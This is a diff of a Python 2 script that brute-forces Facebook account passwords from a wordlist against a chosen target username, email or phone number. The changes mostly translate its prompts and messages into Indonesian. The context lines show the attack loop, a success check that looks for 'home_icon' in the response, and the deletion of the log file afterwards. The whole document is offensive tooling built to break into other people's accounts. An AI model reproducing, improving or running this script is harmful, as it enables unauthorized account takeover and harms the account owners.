@@ -20,9 +20,9 @@ except ModuleNotFoundError:
     exit()
 
 time.sleep(0.5)
-user = raw_input('[?] Target Username/ID/Email >>> ')
+user = raw_input('[?] Target Username/ID/Email/phone >>> ')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
+wrdlstFileName = raw_input('\n[?] wordlist.txt >>> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
@@ -53,12 +53,12 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '[+] Password Found > '+password 
+                print '[+] Password ditemukan > '+password 
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "[!] Wrong Password! > "+str(password)
+                print "[!] Password ini salah! > "+str(password)
         except KeyboardInterrupt:
             print '\n#############################################\n   Exiting..'
             dos.close()
@@ -66,7 +66,9 @@ for password in wordlist:
             exit()
 
 time.sleep(1)
-print 'Sorry, none of the passswords in your wordlist is right.'
+print 'maaf, tidak ada satupun passwrd yg bener.'
+time.sleep(0.8)
+print '\n[?] Coba racik wordlist sendiri gan.'
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
